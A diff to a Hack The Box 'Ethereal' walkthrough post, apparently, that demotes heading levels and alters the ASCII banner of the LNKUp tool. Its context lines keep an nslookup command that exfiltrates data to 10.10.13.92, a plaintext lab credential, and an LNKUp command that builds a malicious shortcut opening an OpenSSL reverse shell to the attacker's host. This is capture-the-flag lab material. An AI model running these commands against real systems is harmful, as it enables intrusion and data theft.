@@ -77,7 +77,7 @@ The file contains a FAT filesystem that we can mount like so.
 ![a3c74dd3.png](/assets/images/posts/ethereal-htb-walkthrough/a3c74dd3.png)
 </a>
 
-## PasswordBox
+### PasswordBox
 
 The directory `pbox` contains a MS-DOS executable `PBOX.EXE`, i.e. PasswordBox [program](https://sourceforge.net/projects/passwbox/).
 
@@ -107,7 +107,7 @@ To make things easier for copying, you can also run `PBOX.EXE` with the `--dump`
 ![3bb1590a.png](/assets/images/posts/ethereal-htb-walkthrough/3bb1590a.png)
 </a>
 
-## Internet Information Services (IIS)
+### Internet Information Services (IIS)
 
 Now, let's turn our attention to the `http` services, `80/tcp` and `8080/tcp`. This is how `80/tcp` looks like.
 
@@ -145,7 +145,7 @@ Recall the credentials we collected earlier? Turns out that (`alan:!C414m17y57r1
 ![4c9e5bee.png](/assets/images/posts/ethereal-htb-walkthrough/4c9e5bee.png)
 </a>
 
-## Test Connection
+### Test Connection
 
 This is how it looks like after logging in.
 
@@ -242,7 +242,7 @@ _Check access control list of files/directories_
 & for /f "tokens=1-10*" %i in ('icacls c:\users\public\desktop\shortcuts') do nslookup %i_%j_%k_%l_%m_%o_%p_%q 10.10.13.92
 ```
 
-## Data Exfiltration
+### Data Exfiltration
 
 Running the command to ***display outbound firewall rules*** reveals the following:
 
@@ -327,7 +327,7 @@ Going deeper into the OpenSSL directory reveals the `openssl.exe` binary.
 ![d87da0ed.png](/assets/images/posts/ethereal-htb-walkthrough/d87da0ed.png)
 </a>
 
-## Remote Command Execution
+### Remote Command Execution
 
 We have two TCP ports allowed for outbound communications and there's OpenSSL available. Perhaps we can create an encrypted tunnel for shuttling data back and forth between the box and my attacking machine?
 
@@ -384,18 +384,18 @@ If I had to guess, I would say that I need to create a malicious shortcut (LNK) 
 # python generate.py --host localhost --out evil.lnk --execute 'c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.13.92:73 | cmd.exe /k /q | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.13.92:136' --type ntlm
 \
   ~==================================================~
-##                                                    ##
-##  /$$       /$$   /$$ /$$   /$$ /$$   /$$           ##
-## | $$      | $$$ | $$| $$  /$$/| $$  | $$           ##
-## | $$      | $$$$| $$| $$ /$$/ | $$  | $$  /$$$$$$  ##
-## | $$      | $$ $$ $$| $$$$$/  | $$  | $$ /$$__  $$ ##
-## | $$      | $$  $$$$| $$  $$  | $$  | $$| $$  \ $$ ##
-## | $$      | $$\  $$$| $$\  $$ | $$  | $$| $$  | $$ ##
-## | $$$$$$$$| $$ \  $$| $$ \  $$|  $$$$$$/| $$$$$$$/ ##
-## |________/|__/  \__/|__/  \__/ \______/ | $$____/  ##
-##                                         | $$       ##
-##                                         | $$       ##
-##                                         |__/       ##
+###                                                    ##
+###  /$$       /$$   /$$ /$$   /$$ /$$   /$$           ##
+### | $$      | $$$ | $$| $$  /$$/| $$  | $$           ##
+### | $$      | $$$$| $$| $$ /$$/ | $$  | $$  /$$$$$$  ##
+### | $$      | $$ $$ $$| $$$$$/  | $$  | $$ /$$__  $$ ##
+### | $$      | $$  $$$$| $$  $$  | $$  | $$| $$  \ $$ ##
+### | $$      | $$\  $$$| $$\  $$ | $$  | $$| $$  | $$ ##
+### | $$$$$$$$| $$ \  $$| $$ \  $$|  $$$$$$/| $$$$$$$/ ##
+### |________/|__/  \__/|__/  \__/ \______/ | $$____/  ##
+###                                         | $$       ##
+###                                         | $$       ##
+###                                         |__/       ##
   ~==================================================~
 
 File saved to /root/Downloads/repo/LNKUp/evil.lnk
